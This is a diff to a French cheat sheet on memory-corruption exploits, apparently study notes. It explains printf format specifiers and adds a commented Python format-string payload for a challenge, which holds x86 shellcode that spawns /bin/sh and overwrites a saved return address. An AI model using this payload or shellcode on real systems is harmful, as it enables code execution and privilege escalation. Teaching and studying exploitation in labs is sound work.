@@ -110,7 +110,7 @@ Les commandes mona suivantes sont utiles pour les exploits ROP:
 ```
 ## Heap attacks
 
-## Structure de la Heap
+## Structure de la Heap (Linux)
 
 La Heap est remplie de chunks. Ils peuvent soit etre en utilisation ou libre.
 
@@ -150,21 +150,34 @@ x/64xw 0x804a000 # Permet d'afficher le contenu à l'adresse indiquée (adresse 
 
 Une vulnérabilité de type format string permet de lire du contenu en mémoire mais aussi de le modifier ce qui permet de faire un RCE.
 
-Format général du payload:
+Les éléments suivants sont importants dans ce type d'exploit:
 
-``` bash
-'\xee\xf7\xff\xbf'
-'\xec\xf7\xff\xbf'
-'AAAA\xcc\xcc'
-'\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f' '\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
-'%49098d'
-'%4\$hn'
-'%14349d'
-'%5\$hn
-[Saved EIP+2][Saved EIP][SHELLCODE][%Xd][%4$hn][%Yd][%5$hn]
+``` c
+printf("%x"); // Prend les deux premières valeurs sur la pile et les affiche en tant que que nombre hexa
+printf("Hello%n"); // Ecrit le nombre de caractères déjà mis dans le printf (ici 5 caractères de Hello) à l'adresse qui est sur la pile. On aura un crash si la première valeur de la pile n'est pas une adresse.
+printf("%5$x"); // Prend la 5e valeur sur la pile
+printf("%10d"); // Prend la première valeur sur la pile et l'affiche en tant qu'entier de 10 caractères (en complétant avec des espaces si nécessaire)
+printf("%5$hn"); // Prend l'adresse en 5e position sur la pile et écrit sur le half-byte s'y trouvant. On utilise ceci pour pouvoir écrire une adresse arbitraire en deux fois. Ainsi si on voulait écrire 0x08091011 il faudrait mettre 134811665 avant le %n. En utilisant %hn on peut le faire en deux fois (0x0809 - 2057 et 0x1011 - 4113)
 ```
-- %4hn & %5hn: le hn indique de modifier le 4/5e half-byte sur la stack et d'y mettre le nombre de caractère précédents.
-- %Xd & %Yd: permettent de générer X et Y caractères.
+
+On peut exploiter ceci de différentes manières:
+- Lire le contenu en mémoire
+- Ecraser une valeur de retour (utile pour des challenges où on doit appeler une fonction précise)
+- Modifier une valeur dans la Global Offset Table (voir [LiveOverflow](https://www.youtube.com/watch?v=kUk5pw4w0h4))
+- Génrer un shellcode.
+
+``` python
+# Solution a un challege
+shellcode = '\xee\xf7\xff\xbf'  # Adresse où se trouve le saved EIP
+shellcode += '\xec\xf7\xff\xbf' # Adresse - 2 où se trouve le saved EIP. Ceci est utilisé pour le "half-write"
+shellcode += 'AAAA\xcc\xcc'     # JUNK et caractères de debug
+shellcode += '\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f' # Shellcode
+shellcode += '\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'     # Shellcode
+shellcode += '%49098d'         # On genère des caractères. En additionant ceux-ci aux précédents (shellcode, etc.) on a 0xbfff caractères imprimés
+shellcode += '%4\$hn'          # On écrase le début 0xbfff
+shellcode += '%14349d'         # On génère plus de caractères 
+shellcode += '%5\$hn'          # On écrase la fin 0xf80c
+```
 
 ### Références
 - [Les failles Format String](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf)
